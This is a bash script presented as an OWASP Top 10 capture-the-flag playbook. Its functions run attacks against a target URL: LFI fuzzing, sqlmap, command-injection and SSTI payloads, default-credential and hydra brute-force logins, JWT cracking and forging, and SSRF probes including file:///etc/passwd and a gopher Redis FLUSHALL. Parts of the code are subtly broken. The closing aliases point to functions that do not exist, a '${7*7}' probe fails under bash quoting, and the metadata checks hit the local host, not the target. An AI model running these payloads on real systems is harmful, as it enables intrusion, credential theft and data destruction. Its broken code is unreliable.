#!/bin/bash
# OWASP TOP 10 (2021) PLAYBOOK — CTF-OPTIMIZED
# LOCATION: /opt/playbooks/owasp-top10-playbook.sh
# USAGE: source /opt/playbooks/owasp-top10-playbook.sh

source /opt/playbooks/scan-helpers.sh

export OWASP_OUTPUT_DIR="/workspace/output/owasp"
export OWASP_REPORTS_DIR="/workspace/output/reports"
mkdir -p "$OWASP_OUTPUT_DIR" "$OWASP_REPORTS_DIR"

# ============================================================
# A01:2021 - BROKEN ACCESS CONTROL
# IDOR, Privilege Escalation, Path Traversal, Forced Browsing
# ============================================================
owasp_a01() {
    local target="$1"
    [ -z "$target" ] && { echo "[A01] Usage: owasp_a01 <target_url>"; return 1; }
    echo "[A01] === BROKEN ACCESS CONTROL ==="
    local out=$(scan_dir "A01_AccessControl" "$target")

    echo "[A01] [1/6] Path Traversal..."
    ffuf -u "$target/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
        -mc 200 -t 30 -timeout 10 -o "$out/path-traversal.json" 2>/dev/null
    # Additional LFI payloads
    ffuf -u "$target/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
        -mc 200 -t 30 -timeout 10 -o "$out/lfi-linux.json" 2>/dev/null

    echo "[A01] [2/6] Forced Browsing..."
    ffuf -u "$target/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
        -mc 200,301,302,403 -t 50 -timeout 10 -o "$out/forced-browse.json" 2>/dev/null
    ffuf -u "$target/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
        -mc 200,301,302,403 -t 30 -timeout 10 -o "$out/hidden-dirs.json" 2>/dev/null

    echo "[A01] [3/6] Clickjacking / Security Headers..."
    curl -sI "$target" > "$out/headers-full.txt"
    echo "X-Frame-Options: $(curl -sI "$target" 2>/dev/null | grep -i x-frame || echo 'MISSING')" > "$out/clickjacking.txt"
    echo "CSP: $(curl -sI "$target" 2>/dev/null | grep -i content-security || echo 'MISSING')" >> "$out/clickjacking.txt"

    echo "[A01] [4/6] HTTP Methods..."
    for m in PUT DELETE PATCH TRACE OPTIONS; do
        echo "  $m: $(curl -s -o /dev/null -w '%{http_code}' -X $m "$target" 2>/dev/null)"
    done > "$out/http-methods.txt"

    echo "[A01] [5/6] CORS misconfiguration..."
    curl -sI -H "Origin: https://evil.com" "$target" | grep -i "access-control-allow" > "$out/cors.txt" 2>/dev/null
    curl -sI -H "Origin: null" "$target" | grep -i "access-control-allow" >> "$out/cors.txt" 2>/dev/null

    echo "[A01] [6/6] IDOR tip — test by changing IDs in URLs"
    echo "  Example: /api/user/1 → /api/user/2 → /api/user/3" > "$out/idor-tips.txt"

    echo "[A01] Results: $out"
}

# ============================================================
# A02:2021 - CRYPTOGRAPHIC FAILURES
# Weak TLS, Sensitive Data Exposure, Cookie Security
# ============================================================
owasp_a02() {
    local target="$1"
    [ -z "$target" ] && { echo "[A02] Usage: owasp_a02 <target_url>"; return 1; }
    echo "[A02] === CRYPTOGRAPHIC FAILURES ==="
    local out=$(scan_dir "A02_Crypto" "$target")

    echo "[A02] [1/5] TLS/SSL cipher scan..."
    nmap --script ssl-enum-ciphers -p 443 "${target#*://}" -oN "$out/tls-ciphers.txt" 2>/dev/null

    echo "[A02] [2/5] Sensitive data in page source..."
    curl -s "$target" | grep -oPi '(token|api_key|apikey|password|passwd|secret|session|auth|private_key|aws_access)[=:][^\s"'\''<>]+' > "$out/sensitive-params.txt" 2>/dev/null

    echo "[A02] [3/5] Cookie security flags..."
    echo "=== Cookies ===" > "$out/cookies.txt"
    curl -sI "$target" | grep -i set-cookie >> "$out/cookies.txt" 2>/dev/null
    echo "=== Missing Flags ===" >> "$out/cookies.txt"
    curl -sI "$target" | grep -i set-cookie | grep -vi "httponly\|secure\|samesite" >> "$out/cookies-insecure.txt" 2>/dev/null

    echo "[A02] [4/5] Security headers..."
    for h in "strict-transport-security" "x-content-type-options" "content-security-policy" "x-frame-options" "referrer-policy"; do
        local found=$(curl -sI "$target" | grep -i "$h" || echo "MISSING")
        echo "  $h: $found"
    done > "$out/security-headers.txt"

    echo "[A02] [5/5] Hidden form fields / autocomplete..."
    curl -s "$target" | grep -i 'type="hidden"\|autocomplete' > "$out/hidden-fields.txt" 2>/dev/null

    echo "[A02] Results: $out"
}

# ============================================================
# A03:2021 - INJECTION
# SQLi, XSS, Command Injection, SSTI, XXE, LDAPi
# ============================================================
owasp_a03() {
    local target="$1"
    [ -z "$target" ] && { echo "[A03] Usage: owasp_a03 <target_url>"; return 1; }
    echo "[A03] === INJECTION ==="
    local out=$(scan_dir "A03_Injection" "$target")
    mkdir -p "$out/sqlmap"

    echo "[A03] [1/6] SQL Injection — sqlmap..."
    sqlmap -u "$target" --batch --level=3 --risk=2 --delay=1 --random-agent \
        --output-dir="$out/sqlmap" 2>/dev/null

    echo "[A03] [2/6] XSS — dalfox..."
    dalfox url "$target" -o "$out/dalfox-xss.txt" --silence --only-poc r 2>/dev/null

    echo "[A03] [3/6] XSS — nuclei templates..."
    nuclei -u "$target" -tags xss -severity low,medium,high,critical \
        -rl 50 -c 10 -timeout 15 -o "$out/xss-nuclei.txt" 2>/dev/null

    echo "[A03] [4/6] SSTI (Server-Side Template Injection)..."
    nuclei -u "$target" -tags ssti -rl 30 -c 10 -timeout 15 -o "$out/ssti.txt" 2>/dev/null
    # Manual SSTI probes
    echo "{{7*7}}" > "$out/ssti-manual.txt"
    echo "${7*7}" >> "$out/ssti-manual.txt"
    echo "<%= 7*7 %>" >> "$out/ssti-manual.txt"
    echo "#{7*7}" >> "$out/ssti-manual.txt"
    echo "  Inject these into all user input fields" >> "$out/ssti-manual.txt"

    echo "[A03] [5/6] Command Injection..."
    nuclei -u "$target" -tags rce -severity low,medium,high,critical \
        -rl 30 -c 10 -timeout 15 -o "$out/rce-nuclei.txt" 2>/dev/null
    # Manual CI payloads
    echo "=== Manual Command Injection Payloads ===" > "$out/cmdi-manual.txt"
    echo "; id" >> "$out/cmdi-manual.txt"
    echo "| id" >> "$out/cmdi-manual.txt"
    echo "\`id\`" >> "$out/cmdi-manual.txt"
    echo "\$(id)" >> "$out/cmdi-manual.txt"

    echo "[A03] [6/6] XXE..."
    nuclei -u "$target" -tags xxe -rl 20 -c 5 -timeout 15 -o "$out/xxe.txt" 2>/dev/null

    echo "[A03] Results: $out"
}

# ============================================================
# A04:2021 - INSECURE DESIGN
# Logic Flaws, User Enumeration, Rate Limiting, Session Issues
# ============================================================
owasp_a04() {
    local target="$1"
    [ -z "$target" ] && { echo "[A04] Usage: owasp_a04 <target_url>"; return 1; }
    echo "[A04] === INSECURE DESIGN ==="
    local out=$(scan_dir "A04_Design" "$target")

    echo "[A04] [1/4] User Enumeration..."
    echo "=== Login Response Differences ===" > "$out/user-enum.txt"
    for user in admin administrator root test nonexistentuser fake123; do
        local size=$(curl -s -o /dev/null -w "%{size_download}" -X POST \
            -d "username=$user&password=wrongpass" "$target/login" 2>/dev/null)
        echo "  $user -> response_size=$size"
    done >> "$out/user-enum.txt"
    echo "  Different sizes = user enumeration possible" >> "$out/user-enum.txt"

    echo "[A04] [2/4] Rate Limiting..."
    echo "=== 20 Rapid Requests ===" > "$out/rate-limit.txt"
    for i in $(seq 1 20); do
        curl -s -o /dev/null -w "  #$i: %{http_code}\n" "$target/login" 2>/dev/null
    done >> "$out/rate-limit.txt"
    echo "  If all 200 = no rate limiting" >> "$out/rate-limit.txt"

    echo "[A04] [3/4] Session Management..."
    curl -sI "$target" > "$out/session-headers.txt"
    echo "=== Cookie Attributes ===" >> "$out/session-headers.txt"
    curl -sI "$target" | grep -i "set-cookie" >> "$out/session-headers.txt" 2>/dev/null
    echo "Check for: HttpOnly, Secure, SameSite, Path restrictions" >> "$out/session-headers.txt"

    echo "[A04] [4/4] Business Logic Tips..."
    echo "  - Can you checkout with $0?" > "$out/logic-tips.txt"
    echo "  - Can you apply negative quantity?" >> "$out/logic-tips.txt"
    echo "  - Can you skip payment step?" >> "$out/logic-tips.txt"
    echo "  - Race condition on transfer/payment?" >> "$out/logic-tips.txt"

    echo "[A04] Results: $out"
}

# ============================================================
# A05:2021 - SECURITY MISCONFIGURATION
# Exposed Admin Panels, Debug Endpoints, Default Creds, Backups
# ============================================================
owasp_a05() {
    local target="$1"
    [ -z "$target" ] && { echo "[A05] Usage: owasp_a05 <target_url>"; return 1; }
    echo "[A05] === SECURITY MISCONFIGURATION ==="
    local out=$(scan_dir "A05_Misconfig" "$target")

    echo "[A05] [1/5] Common debug/sensitive endpoints..."
    for path in /debug /console /trace /actuator /env /info /metrics \
        /heapdump /healthcheck /status /.env /.git/config /.git/HEAD \
        /robots.txt /sitemap.xml /wp-admin /wp-login.php /admin \
        /phpmyadmin /phpinfo.php /server-status /server-info \
        /backup /backup.zip /backup.sql /db.sql /dump.sql \
        /.htaccess /.htpasswd /web.config /config.php /config.json \
        /api/swagger /api-docs /graphql /graphiql /swagger-ui \
        /elmah.axd /trace.axd; do
        local code=$(curl -s -o /dev/null -w "%{http_code}" "$target$path" 2>/dev/null)
        [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $code: $target$path"
    done | sort -u > "$out/endpoints-found.txt"

    echo "[A05] [2/5] Verbose errors..."
    curl -s "$target/nonexistent-404-test-$(date +%s)" | grep -iE "stack.?trace|exception|error in|fatal|warning|debug|traceback|syntax error" > "$out/verbose-errors.txt" 2>/dev/null

    echo "[A05] [3/5] Server version disclosure..."
    curl -sI "$target" | grep -iE "^server:|^x-powered-by|^x-aspnet" > "$out/server-disclosure.txt" 2>/dev/null

    echo "[A05] [4/5] Nmap full service scan..."
    nmap -sV --script http-enum,http-headers,http-default-accounts -p 80,443,8080,8443 \
        "${target#*://}" -oN "$out/nmap-misconfig.txt" 2>/dev/null

    echo "[A05] [5/5] Backup files..."
    for ext in .bak .old .orig .save .zip .tar.gz .sql .db .json .xml .yml .conf; do
        for base in index config database backup db settings admin app web api; do
            local code=$(curl -s -o /dev/null -w "%{http_code}" "$target/$base$ext" 2>/dev/null)
            [ "$code" = "200" ] && echo "  FOUND: $target/$base$ext"
        done
    done > "$out/backup-files.txt"

    echo "[A05] Results: $out"
}

# ============================================================
# A06:2021 - VULNERABLE AND OUTDATED COMPONENTS
# Known CVEs, Tech Fingerprinting, Log4j, Spring4Shell
# ============================================================
owasp_a06() {
    local target="$1"
    [ -z "$target" ] && { echo "[A06] Usage: owasp_a06 <target_url>"; return 1; }
    echo "[A06] === VULNERABLE COMPONENTS ==="
    local out=$(scan_dir "A06_Components" "$target")

    echo "[A06] [1/4] Technology fingerprinting..."
    whatweb -v "$target" > "$out/whatweb.txt" 2>/dev/null

    echo "[A06] [2/4] Nuclei CVE scan..."
    nuclei -u "$target" -tags cve -severity critical,high,medium \
        -rl 50 -c 10 -timeout 15 -o "$out/cve-nuclei.txt" 2>/dev/null

    echo "[A06] [3/4] Log4j (CVE-2021-44228)..."
    nuclei -u "$target" -tags log4j -rl 30 -c 5 -timeout 15 -o "$out/log4j.txt" 2>/dev/null

    echo "[A06] [4/4] Exposed JS files with version info..."
    curl -s "$target" | grep -oP 'src="[^"]*\.js[^"]*"' | head -20 > "$out/js-files.txt"
    echo "  Check versions in JS files for known CVEs" >> "$out/js-files.txt"

    echo "[A06] Results: $out"
}

# ============================================================
# A07:2021 - IDENTIFICATION AND AUTHENTICATION FAILURES
# Default Creds, Brute Force, Weak Passwords, 2FA Bypass
# ============================================================
owasp_a07() {
    local target="$1"
    [ -z "$target" ] && { echo "[A07] Usage: owasp_a07 <target_url>"; return 1; }
    echo "[A07] === AUTHENTICATION FAILURES ==="
    local out=$(scan_dir "A07_Auth" "$target")

    echo "[A07] [1/5] Default credentials check..."
    echo "=== Common Default Credentials ===" > "$out/default-creds.txt"
    for cred in "admin:admin" "admin:password" "admin:12345" "root:root" \
        "admin:admin123" "test:test" "guest:guest" "user:user" \
        "admin:letmein" "admin:welcome" "admin:password1"; do
        local u=$(echo "$cred" | cut -d: -f1)
        local p=$(echo "$cred" | cut -d: -f2)
        local code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -d "username=$u&password=$p" "$target/login" 2>/dev/null)
        [ "$code" != "200" ] || echo "  POSSIBLE HIT: $u:$p (HTTP $code)"
        echo "  $u:$p -> $code" >> "$out/default-creds-attempts.txt"
    done

    echo "[A07] [2/5] Account lockout test..."
    echo "=== 15 Failed Login Attempts ===" > "$out/lockout-test.txt"
    for i in $(seq 1 15); do
        curl -s -o /dev/null -w "  #$i: %{http_code}\n" -X POST \
            -d "username=admin&password=wrong$i" "$target/login" 2>/dev/null
    done >> "$out/lockout-test.txt"

    echo "[A07] [3/5] Password reset weaknesses..."
    curl -s "$target/forgot-password" -o "$out/password-reset.html" 2>/dev/null
    curl -s "$target/reset-password" -o "$out/reset-page.html" 2>/dev/null
    echo "  Check: Does reset token leak in URL? Predictable tokens?" > "$out/password-reset-tips.txt"

    echo "[A07] [4/5] Remember me / session tokens..."
    curl -sI "$target" | grep -i set-cookie > "$out/session-cookies.txt" 2>/dev/null
    echo "  Check: Base64 encoded sessions? Predictable tokens?" >> "$out/session-cookies.txt"

    echo "[A07] [5/5] Hydra brute force (use carefully)..."
    echo "  Command: hydra -l admin -P /usr/share/wordlists/rockyou.txt ${target#*://} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'" > "$out/hydra-cmd.txt"

    echo "[A07] Results: $out"
}

# ============================================================
# A08:2021 - SOFTWARE AND DATA INTEGRITY FAILURES
# Deserialization, JWT, SRI, CORS, Webhook Signature Bypass
# ============================================================
owasp_a08() {
    local target="$1"
    [ -z "$target" ] && { echo "[A08] Usage: owasp_a08 <target_url>"; return 1; }
    echo "[A08] === SOFTWARE AND DATA INTEGRITY ==="
    local out=$(scan_dir "A08_Integrity" "$target")

    echo "[A08] [1/5] JWT token analysis..."
    echo "=== JWT Testing ===" > "$out/jwt-analysis.txt"
    echo "  1. Find JWT in: Authorization header, cookies, localStorage, URL params" >> "$out/jwt-analysis.txt"
    echo "  2. Decode at jwt.io — check alg, kid, payload" >> "$out/jwt-analysis.txt"
    echo "  3. Check: alg=none? RS256→HS256 downgrade? Weak secret?" >> "$out/jwt-analysis.txt"
    echo "  4. Crack with: hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt" >> "$out/jwt-analysis.txt"
    echo "  5. Forge with: jwt_tool <token> -T /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt" >> "$out/jwt-analysis.txt"

    echo "[A08] [2/5] SRI (Subresource Integrity) check..."
    curl -s "$target" | grep -E '<script|<link' | grep -v 'integrity=' > "$out/sri-missing.txt" 2>/dev/null
    echo "  Scripts/links without integrity= attribute are vulnerable to CDN poisoning" >> "$out/sri-missing.txt"

    echo "[A08] [3/5] CORS misconfiguration..."
    for origin in "https://evil.com" "null" "https://${target#*://}"; do
        echo "Origin: $origin" >> "$out/cors-test.txt"
        curl -sI -H "Origin: $origin" "$target" | grep -i "access-control" >> "$out/cors-test.txt" 2>/dev/null
        echo "---" >> "$out/cors-test.txt"
    done

    echo "[A08] [4/5] Deserialization detection..."
    nuclei -u "$target" -tags deserialization -rl 30 -c 5 -timeout 15 -o "$out/deser.txt" 2>/dev/null
    echo "  Look for: Java serialized data (ACED0005), PHP (O:), Python (pickle/base64)" > "$out/deser-tips.txt"

    echo "[A08] [5/5] Parameter tampering..."
    echo "  Test: price=100 → price=-100 (negative pricing)" > "$out/param-tamper.txt"
    echo "  Test: role=user → role=admin" >> "$out/param-tamper.txt"
    echo "  Test: quantity=1 → quantity=0 (free order)" >> "$out/param-tamper.txt"

    echo "[A08] Results: $out"
}

# ============================================================
# A09:2021 - SECURITY LOGGING AND MONITORING FAILURES
# Info Leakage, Error Messages, Missing Audit Trails
# ============================================================
owasp_a09() {
    local target="$1"
    [ -z "$target" ] && { echo "[A09] Usage: owasp_a09 <target_url>"; return 1; }
    echo "[A09] === LOGGING AND MONITORING ==="
    local out=$(scan_dir "A09_Logging" "$target")

    echo "[A09] [1/4] Error-based information disclosure..."
    for trigger in "/404" "/500" "/error" "/api/error" "/debug" "/trace"; do
        echo "=== $target$trigger ===" >> "$out/error-leakage.txt"
        curl -s "$target$trigger" | grep -iE "stack.?trace|exception|error in|fatal|warning|debug|traceback|syntax|at .+\.py|at .+\.java|at .+\.php|query.*select|mysql|postgres|sqlite" >> "$out/error-leakage.txt" 2>/dev/null
    done

    echo "[A09] [2/4] Source code in comments/HTML..."
    curl -s "$target" | grep -iE '<!--.*-->' > "$out/html-comments.txt" 2>/dev/null
    curl -s "$target" | grep -iE 'TODO|FIXME|HACK|BUG|XXX|DEBUG' > "$out/dev-comments.txt" 2>/dev/null

    echo "[A09] [3/4] Verbose API responses..."
    curl -s "$target/api/user/0" 2>/dev/null > "$out/api-verbose.txt"
    curl -s "$target/api/admin" 2>/dev/null >> "$out/api-verbose.txt"
    echo "  Unhandled 404/500 may reveal stack traces and tech info" >> "$out/api-verbose.txt"

    echo "[A09] [4/4] Monitoring checklist..."
    echo "Manual checks:" > "$out/monitoring-checklist.txt"
    echo "  [ ] Are failed logins logged?" >> "$out/monitoring-checklist.txt"
    echo "  [ ] Are admin actions audited?" >> "$out/monitoring-checklist.txt"
    echo "  [ ] Are security events (auth failures, access denied) monitored?" >> "$out/monitoring-checklist.txt"
    echo "  [ ] Are logs protected from tampering?" >> "$out/monitoring-checklist.txt"

    echo "[A09] Results: $out"
}

# ============================================================
# A10:2021 - SERVER-SIDE REQUEST FORGERY (SSRF)
# Internal Port Scan, Cloud Metadata, File Protocol
# ============================================================
owasp_a10() {
    local target="$1"
    [ -z "$target" ] && { echo "[A10] Usage: owasp_a10 <target_url>"; return 1; }
    echo "[A10] === SSRF ==="
    local out=$(scan_dir "A10_SSRF" "$target")

    echo "[A10] [1/5] Basic SSRF probes..."
    for payload in "http://127.0.0.1" "http://localhost" "http://0.0.0.0" \
        "http://[::1]" "http://0x7f000001" "http://2130706433" \
        "http://127.1" "http://127.0.0.1:22" "http://127.0.0.1:3306" \
        "file:///etc/passwd" "file:///etc/hostname" "dict://127.0.0.1:6379/INFO"; do
        # Try common param names
        for param in url uri path src dest redirect next callback return_to q; do
            local code=$(curl -s -o /dev/null -w "%{http_code}" "$target?$param=$payload" 2>/dev/null)
            [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $code: $param=$payload"
        done
    done | sort -u > "$out/ssrf-probes.txt"

    echo "[A10] [2/5] Nuclei SSRF templates..."
    nuclei -u "$target" -tags ssrf -rl 30 -c 10 -timeout 15 -o "$out/ssrf-nuclei.txt" 2>/dev/null

    echo "[A10] [3/5] Cloud metadata endpoints..."
    echo "=== AWS ===" > "$out/cloud-metadata.txt"
    curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" >> "$out/cloud-metadata.txt" 2>/dev/null
    echo "=== GCP ===" >> "$out/cloud-metadata.txt"
    curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" >> "$out/cloud-metadata.txt" 2>/dev/null
    echo "=== Azure ===" >> "$out/cloud-metadata.txt"
    curl -s --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >> "$out/cloud-metadata.txt" 2>/dev/null

    echo "[A10] [4/5] Internal port scan via SSRF..."
    echo "  Test: url=http://127.0.0.1:PORT for common ports" > "$out/internal-scan.txt"
    for port in 22 80 443 3306 5432 6379 8080 8443 27017 9200; do
        local code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 "$target?url=http://127.0.0.1:$port" 2>/dev/null)
        [ "$code" != "000" ] && echo "  Port $port: HTTP $code (may be open)"
    done >> "$out/internal-scan.txt"

    echo "[A10] [5/5] Protocol smuggling..."
    echo "  Try: url=gopher://127.0.0.1:6379/_*1%0d%0aFLUSHALL" > "$out/protocol-smuggling.txt"
    echo "  Try: url=file:///etc/passwd" >> "$out/protocol-smuggling.txt"
    echo "  Try: url=ftp://127.0.0.1" >> "$out/protocol-smuggling.txt"

    echo "[A10] Results: $out"
}

# ============================================================
# FULL SCAN — ALL 10 CATEGORIES
# ============================================================
owasp_full_scan() {
    local target="$1"
    [ -z "$target" ] && { echo "[OWASP] Usage: owasp_full_scan <target_url>"; return 1; }
    echo "[OWASP] ============================================"
    echo "[OWASP] OWASP TOP 10 (2021) FULL SCAN"
    echo "[OWASP] Target: $target"
    echo "[OWASP] Start: $(date)"
    echo "[OWASP] ============================================"

    owasp_a01 "$target"
    owasp_a02 "$target"
    owasp_a03 "$target"
    owasp_a04 "$target"
    owasp_a05 "$target"
    owasp_a06 "$target"
    owasp_a07 "$target"
    owasp_a08 "$target"
    owasp_a09 "$target"
    owasp_a10 "$target"

    echo "[OWASP] ============================================"
    echo "[OWASP] FULL SCAN COMPLETE"
    echo "[OWASP] End: $(date)"
    echo "[OWASP] Results: $OWASP_OUTPUT_DIR"
    echo "[OWASP] ============================================"
}

# ============================================================
# QUICK SCAN — FAST MODE (no sqlmap, limited ffuf)
# ============================================================
owasp_quick_scan() {
    local target="$1"
    [ -z "$target" ] && { echo "[OWASP] Usage: owasp_quick_scan <target_url>"; return 1; }
    echo "[OWASP] ============================================"
    echo "[OWASP] OWASP QUICK SCAN (fast, no sqlmap)"
    echo "[OWASP] Target: $target"
    echo "[OWASP] ============================================"

    owasp_a02 "$target"
    owasp_a05 "$target"
    owasp_a06 "$target"
    owasp_a10 "$target"

    echo "[OWASP] ============================================"
    echo "[OWASP] QUICK SCAN COMPLETE"
    echo "[OWASP] ============================================"
}

# ============================================================
# HELP
# ============================================================
owasp_help() {
    cat << 'HELPMSG'
╔══════════════════════════════════════════════════════╗
║          OWASP TOP 10 (2021) CTF PLAYBOOK            ║
╚══════════════════════════════════════════════════════╝

FULL SCANS:
  owasp_full_scan <url>        Run all 10 categories
  owasp_quick_scan <url>       Fast scan (no sqlmap)

INDIVIDUAL TESTS:
  owasp_a01 <url>    A01 - Broken Access Control
  owasp_a02 <url>    A02 - Cryptographic Failures
  owasp_a03 <url>    A03 - Injection (SQL/XSS/SSTI/XXE/CI)
  owasp_a04 <url>    A04 - Insecure Design
  owasp_a05 <url>    A05 - Security Misconfiguration
  owasp_a06 <url>    A06 - Vulnerable Components (CVEs)
  owasp_a07 <url>    A07 - Authentication Failures
  owasp_a08 <url>    A08 - Software/Data Integrity (JWT/SRI)
  owasp_a09 <url>    A09 - Logging & Monitoring
  owasp_a10 <url>    A10 - SSRF

EXAMPLES:
  owasp_full_scan https://ctf.example.com
  owasp_a03 https://ctf.example.com/login?user=1
  owasp_a10 https://ctf.example.com/fetch?url=test

OUTPUT:
  Results saved to: /workspace/output/owasp/

REFERENCE:
  https://owasp.org/www-project-top-ten/
HELPMSG
}

# ALIASES
alias owasp='owasp_full_scan'
alias owasp-quick='owasp_quick_scan'
alias owasphelp='owasp_help'
alias owasp_a01='owasp_a01_access_control'
alias owasp_a02='owasp_a02_crypto'
alias owasp_a03='owasp_a03_injection'
alias owasp_a04='owasp_a04_design'
alias owasp_a05='owasp_a05_misconfig'
alias owasp_a06='owasp_a06_components'
alias owasp_a07='owasp_a07_auth'
alias owasp_a08='owasp_a08_integrity'
alias owasp_a09='owasp_a09_logging'
alias owasp_a10='owasp_a10_ssrf'

echo "[OWASP] Playbook loaded. Type 'owasphelp' for commands."
